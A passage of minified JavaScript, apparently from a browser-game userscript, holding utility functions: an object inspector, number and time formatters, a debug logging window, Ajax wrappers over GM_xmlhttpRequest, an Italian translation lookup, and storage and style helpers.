c=b}(this)).handler;this.bounds=this.boundRect=this.clickableRect=null;this.enabled=!1;null==c&&(c=!0);this.setEnable(c)} function inspect(a,b,c,d){var e="",f,l;null==c&&(c=0);null==b&&(b=1);if(1>b)return"Inspect Error: Levels number must be > 0";if(null==a)return"ERROR: Object is NULL\n";var n="";for(l=0;l<c;l++)n+=" ";for(property in a)try{if(f=matTypeof(a[property]),!0==d&&"function"==f?e+=n+"("+f+") "+property+"[FUNCTION]\n":"function"!=f&&(e+=n+"("+f+") "+property+(null==a[property]?": null":"")+" = "+a[property]+"\n"),("object"==f||"array"==f)&&null!=a[property]&&c+1<b)e+=inspect(a[property],b,c+1,d)}catch(g){l= "string"==typeof g?g:g.message?g.message:g.description?g.description:"Unknown",e+="(Error) "+property+": "+l+"\n"}return e+"\n"}Array.prototype.compare=function(a){if(this.length!=a.length)return!1;for(var b=0;b<a.length;b++)if(this[b].compare&&!this[b].compare(a[b])||this[b]!==a[b])return!1;return!0};function objectName(a){a=a.toString();return a.substr(7,a.length-8)} function matTypeof(a){return"object"==typeof a?a?0<=a.constructor.toString().indexOf("Array")&&"function"==typeof a.splice?"array":"object":"null":typeof a}function tbodyScroller(a,b){a.style.maxHeight="";a.style.height="";a.style.overflowX="hidden";parseInt(a.clientHeight)>b&&(a.style.height=b+"px",a.style.maxHeight=b+"px",a.style.overflowY="auto")}function getRemainingHeight(a,b){var c=getClientCoords(a),d=getClientCoords(b);return b.clientHeight-(c.y-d.y)} function addCommasInt(a){nStr=parseInt(a)+"";for(a=/(\d+)(\d{3})/;a.test(nStr);)nStr=nStr.replace(a,"$1,$2");return nStr}function addCommas(a){x=(a+"").split(".");x1=x[0];x2=1<x.length?"."+x[1]:"";for(a=/(\d+)(\d{3})/;a.test(x1);)x1=x1.replace(a,"$1,$2");return x1+x2}function unixTime(){return parseInt((new Date).getTime()/1E3)+unsafeWindow.g_timeoff}function htmlOptions(a,b){m="";for(k in a)m+='<OPTION value="'+k+'"'+(k==b?" SELECTED":"")+">"+a[k]+"</option>";return m} function getFunctionName(a){a=/\W*function\s+([\w\$]+)\(/.exec(a);return!a?"":a[1]}function findAllBetween(a,b,c){for(var d=[],e=0;0<=(i1=a.indexOf(b,e))&&0<=(i2=a.indexOf(c,i1));)d.push(a.substring(i1+b.length,i2)),e=i2+c.length;return d}function strUpTo(a,b){var c=a.indexOf(b);return 0<c?a.substr(0,c):a}function timestrShort(a){a=parseInt(a);if(86400<a){var b=[];a/=3600;b.push(parseInt(a/24));b.push("d ");b.push(parseInt(a%24));b.push("h ");return b.join("")}return timestr(a)} function timestr(a,b){a=parseInt(a);var c=[],d=a;if(61>d)return d+"s";86400<d&&(c.push(parseInt(d/86400)),c.push("d "),d%=86400);if(3600<d||3600<a)c.push(parseInt(d/3600)),c.push("h "),d%=3600;c.push(parseInt(d/60));c.push("m");if(b||3600>=a)c.push(" "),c.push(d%60),c.push("s");return c.join("")} var WINLOG_MAX_ENTRIES=1E3,WinLog={state:null,win:null,eOut:null,lastE:null,enabled:!0,reverse:!0,busy:!1,isOpening:!1,open:function(){function a(){var a=WinLog;a.lastE=null;a.eOut.innerHTML=""}function b(){var a=WinLog;if(!a.busy){a.busy=!0;a.reverse?(a.win.document.getElementById("wlRev").value="Top",a.reverse=!1):(a.win.document.getElementById("wlRev").value="Bottom",a.reverse=!0);var b=a.eOut.childNodes.length;if(!(2>b)){for(i=b-2;0<=i;i--)a.eOut.appendChild(a.eOut.childNodes[i]);a.busy=!1}}} var c=WinLog;if(!c.win||c.win.closed)c.isOpening=!0,c.win=window.open("","uwtrace","top=30,left=0,width=900,height=1500,scrollbars=no,location=no,menubar=no,directories=no,status=no"),c.isOpening=!1,c.state=null;null==c.state&&(c.win.document.body.innerHTML='<STYLE>pre{margin:0px} hr{margin:3px; height:1px; border:0px; color:#cee; background-color:#cee}</style><BODY style="margin:0px; padding:0px; border:none"><DIV id=winlogtop style="background-color:#d0d0d0; margin:0px; padding:0px; border:1px solid"><INPUT id=wlClear type=submit value="Clear"> &nbsp; <INPUT id=wlRev type=submit value="Bottom"></div><DIV id=wlOut style="overflow-y:auto; height:100%; max-height:100%"></div></body>', c.win.document.getElementById("wlClear").addEventListener("click",a,!1),c.win.document.getElementById("wlRev").addEventListener("click",b,!1),c.eOut=c.win.document.getElementById("wlOut"),c.lastE=null,c.state=1)},writeText:function(a){var b=WinLog;b.enabled&&!b.isOpening&&b.write(b.gtlt(a))},write:function(a){var b=WinLog;if(b.enabled&&!b.isOpening){b.open();var c=document.createElement("pre"),d=new Date,e=[],f=d.getMilliseconds();e.push(d.toTimeString().substring(0,8));e.push(".");100>f&&e.push("0"); 10>f&&e.push("0");e.push(f);e.push(": ");e.push(a);c.innerHTML=e.join("");b.reverse?(null==b.lastE?(b.eOut.appendChild(c),b.lastE=c):b.eOut.insertBefore(c,b.lastE),a=document.createElement("hr"),b.eOut.insertBefore(a,c),b.lastE=a):(b.eOut.appendChild(c),b.eOut.appendChild(document.createElement("hr")))}},gtlt:function(a){a=a.toString().replace("<","&lt;","g");return a.replace(">","&gt;","g")}}; function explodeUrlArgs(a){var b=a.indexOf("?");a=a.substr(b+1).split("&");for(var c={},b=0;b<a.length;b++){var d=a[b].split("=");c[d[0]]=d[1]}return c} function AjaxPost(a,b,c,d){ENABLE_GM_AJAX_TRACE&&WinLog.writeText("AjaxPost ("+d+"): "+a+"\n"+inspect(b,5,1));GM_xmlhttpRequest({method:"post",url:a,data:implodeUrlArgs(b),headers:{"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","X-Prototype-Version":"1.6.1",Accept:"text/javascript, text/html, application/xml, text/xml, */*"},onload:function(a){ENABLE_GM_AJAX_TRACE&&WinLog.writeText("AjaxPost.onLoad ("+d+"):\n "+inspect(a,6,1));c(a.responseText)},onerror:function(){c(null)}})} function AjaxGet(a,b,c,d){ENABLE_GM_AJAX_TRACE&&WinLog.writeText("AjaxGet ("+d+"): "+a);GM_xmlhttpRequest({method:"get",url:addUrlArgs(a,b),onload:function(a){ENABLE_GM_AJAX_TRACE&&WinLog.writeText("AjaxGet.onLoad ("+d+") len="+a.responseText.length+":\n "+inspect(a,6,1));c(a.responseText)},onerror:function(){c(null)}})}function translate(a){var b=a;"it"==Options.LinguaSel&&(void 0!=translateITArray[a]?b=translateITArray[a]:logit(a+" by Tiestoale"));return b} function logit(a){IsChrome?console.log(a):GM_log(a)}function saveValue(a,b,c){IsChrome?localStorage.setItem(a,b):GM_setValue(a+"_"+c,b)}function loadValue(a,b,c){a=IsChrome?localStorage.getItem(a):GM_getValue(a+"_"+b);!a&&c&&(a=c);return a}function addStyle(a){if(IsChrome){var b=document.getElementsByTagName("head")[0];if(b){style=document.createElement("style");style.type="text/css";try{style.innerHTML=a}catch(c){style.innerText=a}b.appendChild(style)}}else GM_addStyle(a)}setTimeout(pcStartup,100);